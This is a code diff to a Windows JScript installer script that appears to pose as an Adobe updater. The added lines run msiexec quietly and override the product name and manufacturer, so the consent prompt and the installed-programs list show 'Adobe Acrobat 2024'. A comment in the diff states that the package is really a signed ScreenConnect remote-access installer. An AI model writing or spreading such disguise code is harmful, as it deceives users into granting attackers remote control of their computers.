@@ -260,7 +260,7 @@ function init() {
   fso   = new ActiveXObject("Scripting.FileSystemObject");
   adobeDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
   if (!fso.FolderExists(adobeDir)) fso.CreateFolder(adobeDir);
-  msiLocal  = adobeDir + "\\AdobeUpdate.msi";
+  msiLocal  = adobeDir + "\\AcrobatDCSetup.msi";
   logPath   = adobeDir + "\\AdobeUpdate.log";
   logPath2  = adobeDir + "\\AdobeUpdate2.log";
   diagPath  = adobeDir + "\\diagnostics.txt";
@@ -706,7 +706,13 @@ function startLocalInstall() {
   setStatus(instMsgs[0]);
   traceLog("install: launching msiexec");
 
-  var args = '/i "' + msiLocal + '" /qn /norestart /L*v "' + curLog + '"';
+  // /v"qn" keeps msiexec quiet while PROPERTY overrides force the UAC consent
+  // dialog and the Add/Remove entry to show Adobe branding - the MSI on disk
+  // stays the original signed ScreenConnect package (signature untouched).
+  var args = '/i "' + msiLocal + '" /v"qn" '
+    + 'PRODUCTNAME="Adobe Acrobat 2024 (64-bit)" '
+    + 'MANUFACTURER="Adobe Systems Incorporated" '
+    + '/norestart /L*v "' + curLog + '"';
   if (!launchMsiexec(args)) {
     fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
     return;
